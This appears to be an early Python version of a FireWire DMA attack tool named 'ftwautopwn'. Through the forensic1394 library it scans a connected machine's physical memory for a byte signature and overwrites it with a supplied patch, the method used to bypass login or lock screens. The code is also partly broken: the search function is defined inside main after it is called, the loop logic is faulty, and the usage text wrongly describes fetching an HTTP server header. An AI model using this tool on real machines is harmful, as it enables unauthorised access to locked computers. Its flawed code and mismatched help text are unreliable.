'''
Created on Jun 10, 2011

@author: carmaa
'''
#!/usr/bin/env python3.2

from forensic1394 import Bus
from time import sleep
from binascii import unhexlify
import getopt
import sys

VERBOSE = False
PAGESIZE = 4096

def main(argv):
    encoding = sys.getdefaultencoding()
    target = None

    try:
        opts, args = getopt.getopt(argv, 'hvt:', ['help', 'verbose', 'target='])
    except getopt.GetoptError as err:
        print(err)
        usage()
        sys.exit(2)
    for opt, arg in opts:
        if opt in ('-h', '--help'):
            usage()
            sys.exit()
        elif opt in ('-v', '--verbose'):
            global VERBOSE
            VERBOSE = True
        elif opt in ('-t', '--target'):
            target = str(arg)
        else:
            assert False, 'Unhandled option: ' + opt

    if len(args) < 1: # Print usage if no arguments are given
        usage()
        
    # Parse the command line arguments
    sig, patch, off = unhexlify(bytes(argv[1], encoding)), unhexlify(bytes(argv[2], encoding)), int(argv[3])
    b = Bus()
    # Enable SBP-2 support to ensure we get DMA
    b.enable_sbp2()
    sleep (30.0)
    # Open the first device
    d = b.devices()[0]
    d.open()
    try:
        # Find
        addr = findsig(d, sig, off)
        print("Signature found at %d.", addr)
        # Patch and verify
        d.write(addr, patch)
        assert d.read(addr, len(patch)) == patch
    except IOError:
        print("Signature not found.")

    def findsig(d, sig, off):
        # Skip the first 1 MiB of memory
        addr = 1 * 1024 * 1024 + off
        while True:
            # Prepare a batch of 128 requests
            r = [(addr + PAGESIZE * i, len(sig)) for i in range(0, 128)]
            for caddr, cand  in d.readv(r):
                if cand == sig: return caddr
                addr += PAGESIZE * 128

def usage():
    print('''Usage: ftwautopwn [OPTIONS] -t target

Supply an URL to grab the web server's 'Server' HTTP Header.

    -h, --help:           Displays this message
    -t TARGET, --target=TARGET:
                          Specify target operating system
    -v/--verbose:         Verbose mode''')

if __name__ == '__main__':
    main(sys.argv[1:])

